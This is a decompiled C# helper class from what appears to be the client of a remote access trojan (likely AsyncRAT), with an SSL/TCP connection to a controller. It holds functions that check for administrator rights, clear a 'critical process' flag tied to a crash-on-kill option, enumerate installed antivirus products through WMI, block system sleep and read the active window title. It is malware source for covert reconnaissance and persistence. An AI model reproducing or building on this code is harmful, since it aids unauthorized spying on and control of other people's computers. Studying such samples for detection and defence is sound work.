using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.Management;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Principal;
using System.Text;
using Client.Connection;

namespace Client.Helper
{
	// Token: 0x02000009 RID: 9
	public static class Methods
	{
		// Token: 0x06000030 RID: 48 RVA: 0x00003488 File Offset: 0x00001688
		public static bool IsAdmin()
		{
			return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
		}

		// Token: 0x06000031 RID: 49 RVA: 0x000034A0 File Offset: 0x000016A0
		public static void ClientOnExit()
		{
			try
			{
				if (Convert.ToBoolean(Settings.BDOS) && Methods.IsAdmin())
				{
					ProcessCritical.Exit();
				}
				MutexControl.CloseMutex();
				SslStream sslClient = ClientSocket.SslClient;
				if (sslClient != null)
				{
					sslClient.Close();
				}
				Socket tcpClient = ClientSocket.TcpClient;
				if (tcpClient != null)
				{
					tcpClient.Close();
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000032 RID: 50 RVA: 0x00003518 File Offset: 0x00001718
		public static string Antivirus()
		{
			string result;
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct"))
				{
					List<string> list = new List<string>();
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						list.Add(managementBaseObject["displayName"].ToString());
					}
					if (list.Count == 0)
					{
						result = "N/A";
					}
					else
					{
						result = string.Join(", ", list.ToArray());
					}
				}
			}
			catch
			{
				result = "N/A";
			}
			return result;
		}

		// Token: 0x06000033 RID: 51 RVA: 0x00003604 File Offset: 0x00001804
		public static ImageCodecInfo GetEncoder(ImageFormat format)
		{
			foreach (ImageCodecInfo imageCodecInfo in ImageCodecInfo.GetImageDecoders())
			{
				if (imageCodecInfo.FormatID == format.Guid)
				{
					return imageCodecInfo;
				}
			}
			return null;
		}

		// Token: 0x06000034 RID: 52 RVA: 0x00003650 File Offset: 0x00001850
		public static void PreventSleep()
		{
			try
			{
				NativeMethods.SetThreadExecutionState((NativeMethods.EXECUTION_STATE)2147483651U);
			}
			catch
			{
			}
		}

		// Token: 0x06000035 RID: 53 RVA: 0x00003684 File Offset: 0x00001884
		public static string GetActiveWindowTitle()
		{
			try
			{
				StringBuilder stringBuilder = new StringBuilder(256);
				if (NativeMethods.GetWindowText(NativeMethods.GetForegroundWindow(), stringBuilder, 256) > 0)
				{
					return stringBuilder.ToString();
				}
			}
			catch
			{
			}
			return "";
		}
	}
}
